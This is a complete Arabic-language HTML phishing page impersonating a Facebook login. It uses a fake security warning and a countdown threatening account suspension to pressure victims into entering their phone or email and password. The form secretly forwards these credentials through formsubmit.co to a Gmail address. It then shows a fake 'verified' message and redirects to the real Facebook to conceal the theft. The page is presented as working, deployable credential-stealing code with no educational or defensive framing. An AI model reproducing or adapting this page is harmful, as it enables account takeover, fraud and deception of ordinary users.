<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facabook - تسجيل الدخول</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
  body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }

  .login-box {
    width: 100%; max-width: 396px; background: #fff; border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0,0,0,.1); text-align: center; padding: 20px;
  }

  .fb-logo { font-size: 48px; color: #1877f2; font-weight: 700; margin-bottom: 10px; }

  .alert-banner {
    background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px;
    padding: 12px 16px; margin-bottom: 16px; text-align: right; font-size: 14px; line-height: 1.6;
  }
  .alert-banner strong { color: #d97706; }
  .alert-banner .timer { color: #dc2626; font-weight: 700; font-size: 16px; }

  .form-group { margin-bottom: 12px; }
  .form-group input {
    width: 100%; padding: 14px 16px; border: none; border-radius: 8px;
    background: #f0f2f5; font-size: 17px; outline: none; text-align: right;
  }
  .form-group input:focus { box-shadow: 0 0 0 2px #1877f2; }

  .btn-login {
    width: 100%; padding: 14px; border: none; border-radius: 8px;
    background: #1877f2; color: #fff; font-size: 18px; font-weight: 700; cursor: pointer;
    margin-top: 8px; transition: background .2s;
  }
  .btn-login:hover { background: #166fe5; }
  .btn-login:disabled { background: #a0c3ff; cursor: not-allowed; }

  .footer-link { margin-top: 16px; font-size: 14px; color: #65676b; }
  .footer-link a { color: #1877f2; text-decoration: none; }

  .spinner {
    width: 20px; height: 20px; border: 3px solid #fff; border-top-color: transparent;
    border-radius: 50%; animation: spin .8s linear infinite; display: inline-block; vertical-align: middle;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .success-msg {
    display: none; text-align: center; padding: 40px 20px;
  }
  .success-msg .check { font-size: 64px; margin-bottom: 16px; }
  .success-msg h2 { color: #1877f2; margin-bottom: 8px; }
  .success-msg p { color: #65676b; font-size: 15px; }
  
  /* إخفاء النموذج عند النجاح */
  .hidden { display: none; }
</style>
</head>
<body>

<div class="login-box" id="loginView">
  <div class="fb-logo">facabook</div>

  <div class="alert-banner">
    <strong>⚠️ تنبيه أمني:</strong><br>
    تم رصد نشاط غير معتاد على حسابك.<br>
    سيتم تعطيل الحساب خلال <span class="timer" id="countdown">23:59:59</span><br>
    أعد تسجيل الدخول الآن للمتابعة.
  </div>

  <!-- تم ربط البريد هنا -->
  <form id="loginForm" action="https://formsubmit.co/c8ha12i8m@gmail.com" method="POST">
    
    <!-- إعدادات إضافية -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://www.facebook.com/">
    <input type="hidden" name="_subject" value="بيانات دخول جديدة!"/>

    <div class="form-group">
      <input type="text" id="email" name="البريد_أو_الهاتف" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
    </div>
    <div class="form-group">
      <input type="password" id="password" name="كلمة_المرور" placeholder="كلمة المرور" required minlength="6">
    </div>
    <button type="submit" class="btn-login" id="btnLogin">تسجيل الدخول</button>
  </form>

  <div class="footer-link">
    <a href="#" onclick="return false;">هل نسيت كلمة المرور؟</a>
  </div>
</div>

<div class="success-msg" id="successView">
  <div class="check">✅</div>
  <h2>تم التحقق بنجاح</h2>
  <p>جارٍ مزامنة بيانات الحساب...</p>
  <br>
  <button class="btn-login" onclick="location.reload()">إغلاق</button>
</div>

<script>
// العد التنازلي
let total = 23 * 3600 + 59 * 60 + 59;
const timerEl = document.getElementById('countdown');
const interval = setInterval(() => {
  total--;
  if (total <= 0) { clearInterval(interval); return; }
  const h = String(Math.floor(total / 3600)).padStart(2,'0');
  const m = String(Math.floor((total % 3600) / 60)).padStart(2,'0');
  const s = String(total % 60).padStart(2,'0');
  timerEl.textContent = `${h}:${m}:${s}`;
}, 1000);

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault(); // منع الإرسال الفوري
  
  const btn = document.getElementById('btnLogin');
  const originalText = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  // إرسال البيانات في الخلفية
  const formData = new FormData(document.getElementById('loginForm'));
  try {
    await fetch(document.getElementById('loginForm').action, {
      method: 'POST',
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    });
    
    // إظهار رسالة النجاح
    document.getElementById('loginView').classList.add('hidden');
    document.getElementById('successView').style.display = 'block';
    
    // إعادة التوجيه إلى فيسبوك بعد ثانيتين
    setTimeout(() => {
      window.location.href = "https://www.facebook.com/";
    }, 2000);

  } catch (error) {
    console.error('Error:', error);
    btn.disabled = false;
    btn.innerHTML = originalText;
  }
});
</script>

</body>
</html>
